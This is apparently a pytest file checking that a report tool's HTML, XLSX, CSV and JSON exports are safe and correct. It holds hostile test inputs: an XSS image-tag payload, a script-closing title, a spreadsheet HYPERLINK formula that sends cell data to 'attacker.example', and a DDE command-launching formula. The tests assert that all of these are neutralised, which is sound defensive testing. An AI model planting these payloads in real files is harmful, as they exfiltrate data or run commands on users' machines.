"""Exporters (DESIGN §14.2): the files open and contain what the report computed."""

import csv
import html
import io
import re
import zipfile
from dataclasses import replace
from datetime import UTC, datetime

import pytest
from openpyxl import load_workbook

from factories import fixture_board
from planning import plan_of
from pulseboard.domain.types import ExportFormat, ReportId
from pulseboard.exports.base import ExportOptions, PlotlyLibrary, ReportDocument, load_exporters
from pulseboard.exports.formats import CHART_SCRIPT, content_security_policy, library_file_name
from pulseboard.reports.base import ReportContext, ReportResult, Table, build_context, load_reports
from pulseboard.settings import Settings

NOW = datetime(2026, 10, 19, 9, tzinfo=UTC)


@pytest.fixture(scope="module")
def ctx() -> ReportContext:
    board = fixture_board()
    return build_context(plan_of(board), [board], Settings())


@pytest.fixture(scope="module")
def gantt(ctx: ReportContext) -> ReportResult:
    return load_reports()[ReportId.GANTT].build(ctx)


def test_registry() -> None:
    assert set(load_exporters()) == {
        ExportFormat.HTML,
        ExportFormat.XLSX,
        ExportFormat.CSV,
        ExportFormat.JSON,
    }


def test_html_is_self_contained_with_csp(gantt: ReportResult, ctx: ReportContext) -> None:
    rendered = load_exporters()[ExportFormat.HTML].render(gantt, ctx.plan, NOW)
    page = rendered.content.decode()

    assert rendered.media_type.startswith("text/html")
    assert rendered.extension == "html"
    match = re.search(r'Content-Security-Policy" content="([^"]+)"', page)
    assert match is not None
    policy = html.unescape(match.group(1))  # browsers decode attribute entities
    nonce = re.search(r"'nonce-([^']+)'", policy)
    assert nonce is not None
    assert "default-src 'none'" in policy
    scripts = re.findall(r"<script\b[^>]*>", page)
    assert scripts
    assert all(f'nonce="{nonce.group(1)}"' in s for s in scripts)
    assert "plotly" in page.lower()
    # Plotly escapes "/" as \u002f inside its embedded JSON; the browser decodes it.
    assert r"acme.atlassian.net\u002fbrowse\u002fABC-105" in page
    assert ctx.plan.plan_id in page
    assert page.count("<tr>") == 1 + len(gantt.tables[0].rows)


def test_html_escapes_table_cells(ctx: ReportContext) -> None:
    hostile = ReportResult(
        report_id=ReportId.STATUS_SUMMARY,
        title="T <b>",
        tables=(Table("t", ("c",), (("<img src=x onerror=alert(1)>",),)),),
        figure=None,
    )
    page = load_exporters()[ExportFormat.HTML].render(hostile, ctx.plan, NOW).content.decode()

    assert "<img src=x" not in page
    assert "&lt;img src=x onerror=alert(1)&gt;" in page
    assert "T &lt;b&gt;" in page


def test_csp_nonce_changes_per_export(gantt: ReportResult, ctx: ReportContext) -> None:
    exporter = load_exporters()[ExportFormat.HTML]
    first = exporter.render(gantt, ctx.plan, NOW).content
    second = exporter.render(gantt, ctx.plan, NOW).content

    assert first != second
    assert "script-src 'nonce-abc'" in content_security_policy("abc")


def test_xlsx_opens_with_a_sheet_per_table(gantt: ReportResult, ctx: ReportContext) -> None:
    rendered = load_exporters()[ExportFormat.XLSX].render(gantt, ctx.plan, NOW)
    book = load_workbook(io.BytesIO(rendered.content))

    assert book.sheetnames == ["summary", "schedule"]
    rows = list(book["schedule"].iter_rows(values_only=True))
    assert rows[0][:3] == ("key", "summary", "assignee")
    assert len(rows) == 1 + len(gantt.tables[0].rows)


def test_csv_single_table(gantt: ReportResult, ctx: ReportContext) -> None:
    rendered = load_exporters()[ExportFormat.CSV].render(gantt, ctx.plan, NOW)
    rows = list(csv.reader(io.StringIO(rendered.content.decode())))

    assert rendered.extension == "csv"
    assert rows[0][0] == "key"
    assert len(rows) == 1 + len(gantt.tables[0].rows)


def test_csv_several_tables_come_zipped(ctx: ReportContext) -> None:
    status = load_reports()[ReportId.STATUS_SUMMARY].build(ctx)
    rendered = load_exporters()[ExportFormat.CSV].render(status, ctx.plan, NOW)
    archive = zipfile.ZipFile(io.BytesIO(rendered.content))

    assert rendered.media_type == "application/zip"
    assert sorted(archive.namelist()) == ["forecast.csv", "status.csv", "warnings.csv"]
    assert archive.read("status.csv").decode().splitlines()[1] == "to_do,7"


def test_json_document(gantt: ReportResult, ctx: ReportContext) -> None:
    rendered = load_exporters()[ExportFormat.JSON].render(gantt, ctx.plan, NOW)
    doc = ReportDocument.model_validate_json(rendered.content)

    assert doc.report_id is ReportId.GANTT
    assert doc.plan_id == ctx.plan.plan_id
    assert doc.tables[0].name == "schedule"
    assert len(doc.tables[0].rows) == 9


def test_html_follows_the_viewer_theme_when_both_figures_exist(
    gantt: ReportResult, ctx: ReportContext
) -> None:
    exporter = load_exporters()[ExportFormat.HTML]
    auto = exporter.render(replace(gantt, dark_figure=gantt.figure), ctx.plan, NOW)
    light = exporter.render(gantt, ctx.plan, NOW).content.decode()
    dark = exporter.render(gantt, ctx.plan, NOW, ExportOptions(dark=True)).content.decode()

    page = auto.content.decode()
    assert 'id="figure-dark"' in page
    assert "data-theme" not in page.split("<head>")[0]
    assert '<html lang="en" data-theme="light">' in light
    assert '<html lang="en" data-theme="dark">' in dark
    assert "prefers-color-scheme: dark" in CHART_SCRIPT


def test_figure_json_cannot_close_its_script_element(ctx: ReportContext) -> None:
    import plotly.graph_objects as go

    from pulseboard.exports.formats import figure_json

    text = figure_json(go.Figure(layout={"title": {"text": "</script><b>"}}))

    assert "</script>" not in text
    assert "<" not in text


@pytest.mark.parametrize(
    ("library", "script"),
    [
        (PlotlyLibrary.INLINE, None),
        (PlotlyLibrary.CDN, "https://cdn.plot.ly/plotly-"),
        (PlotlyLibrary.SHARED, "plotly-"),
    ],
)
def test_plotly_library_inclusion(
    gantt: ReportResult, ctx: ReportContext, library: PlotlyLibrary, script: str | None
) -> None:
    rendered = load_exporters()[ExportFormat.HTML].render(
        gantt, ctx.plan, NOW, ExportOptions(library=library)
    )
    page = rendered.content.decode()
    sources = re.findall(r'<script[^>]* src="([^"]+)"', page)

    if script is None:
        assert sources == []
        assert len(page) > 3_000_000  # self-contained
    else:
        assert len(sources) == 1
        assert sources[0].startswith(script)
        assert sources[0].endswith(".min.js")
        assert len(page) < 1_000_000
    if library is PlotlyLibrary.CDN:
        assert re.search(r'integrity="sha256-[^"]+" crossorigin="anonymous"', page)
    assert [name for name, _ in rendered.assets] == (
        [library_file_name()] if library is PlotlyLibrary.SHARED else []
    )


def test_reduced_toolbar() -> None:
    assert '"toImage", svg], ["zoom2d", "pan2d", "resetScale2d"]' in CHART_SCRIPT
    assert "displaylogo: false" in CHART_SCRIPT
    assert 'indexOf("https://") === 0' in CHART_SCRIPT  # bars open only https Jira links


FORMULAS = (
    '=HYPERLINK("https://attacker.example/?d="&A3,"Open")',
    "=1+1",
    "+1+1",
    "-2+3",
    "@SUM(A1)",
    "\t=1",
    "\r=1",
)


def formula_result() -> ReportResult:
    rows = tuple((text, 3, -1.5) for text in (*FORMULAS, "plain", "a=b"))
    return ReportResult(
        report_id=ReportId.STATUS_SUMMARY,
        title="t",
        tables=(Table(name="cells", columns=("=summary", "n", "x"), rows=rows),),
        figure=None,
        summary=("=cmd|' /C calc'!A0",),
    )


def test_spreadsheets_never_contain_formulas(ctx: ReportContext) -> None:
    """PB-03: Jira text that starts like a formula stays text in XLSX and CSV exports."""
    result = formula_result()
    exporters = load_exporters()

    workbook = load_workbook(
        io.BytesIO(exporters[ExportFormat.XLSX].render(result, ctx.plan, NOW).content)
    )
    cells = [c for ws in workbook.worksheets for row in ws.iter_rows() for c in row]
    text = list(
        csv.reader(
            io.StringIO(exporters[ExportFormat.CSV].render(result, ctx.plan, NOW).content.decode())
        )
    )

    assert not [c.coordinate for c in cells if c.data_type == "f"]
    sheet = {c.value for c in cells}
    assert set(FORMULAS) <= sheet  # the exact text, stored as text
    assert -1.5 in sheet  # numbers stay numbers
    fields = [f for row in text for f in row]
    texts = [f for f in fields if not re.fullmatch(r"-?\d+(\.\d+)?", f)]  # numbers are numbers
    assert not [f for f in texts if f.startswith(("=", "+", "-", "@", "\t", "\r"))]
    assert {f"'{f}" for f in FORMULAS} <= set(fields)
    assert {"plain", "a=b", "3", "-1.5"} <= set(fields)  # only text cells are changed
